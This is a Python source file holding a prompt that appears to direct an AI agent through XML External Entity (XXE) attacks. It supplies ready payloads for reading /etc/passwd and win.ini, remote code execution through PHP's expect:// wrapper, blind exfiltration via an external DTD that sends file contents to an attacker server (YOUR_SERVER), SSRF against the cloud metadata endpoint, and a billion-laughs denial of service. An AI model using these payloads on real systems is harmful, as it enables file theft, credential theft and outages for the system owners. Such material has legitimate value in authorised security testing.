"""
XXE (XML External Entity) Attack Skill Prompt.
"""
XXE_SKILL_PROMPT = """
## ATTACK SKILL: XXE (XML EXTERNAL ENTITY)

**CRITICAL: This attack skill has been CLASSIFIED as XXE.**
**Follow the XXE workflow below. Do NOT switch to other attack methods**
**until you have exhausted the full detection and exploitation path.**

---

### MANDATORY XXE WORKFLOW

#### STEP 1: DETECTION — Find XML parsers

Any endpoint that accepts XML (Content-Type: application/xml, text/xml) or SVG/Office/PDF upload is a candidate:
1. Send a normal XML payload — note baseline response.
2. Send XML with an inline DOCTYPE declaration — if accepted, parser is vulnerable.
3. Check for error messages revealing parser type (libxml, Xerces, .NET XmlDocument).

**Detection probes:**
- `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "test">]><root>&xxe;</root>` — basic entity test
- Add `<!ENTITY xxe SYSTEM "file:///etc/passwd">` for file read test
- Change Content-Type to `application/xml` on endpoints that accept JSON/forms

#### STEP 2: EXPLOITATION — File Read

**Classic file read (try in order):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Windows targets:**
```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
```

**PHP expect:// wrapper (RCE on some configs):**
```xml
<!ENTITY xxe SYSTEM "expect://id">
```

#### STEP 3: BLIND XXE — Out-of-Band Exfiltration

When the response doesn't echo the entity value:

**Parameter entity + external DTD:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_SERVER/evil.dtd">
  %xxe;
]>
<root>&exfil;</root>
```

**evil.dtd (hosted on your server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_SERVER/?data=%file;'>">
%eval;
```

#### STEP 4: SSRF CHAIN — Internal Service Access

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

Use XXE to hit cloud metadata endpoints (AWS, Azure, GCP), internal APIs, or admin panels.

#### STEP 5: DENIAL OF SERVICE

**Billion Laughs attack:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

#### ANTI-PATTERNS (DO NOT DO):
- Do NOT skip OOB testing when inline XXE fails — blind XXE is common.
- Do NOT ignore SVG/Office/DOCX upload endpoints — they ARE XML.
- Do NOT send billion laughs against production without approval.
"""
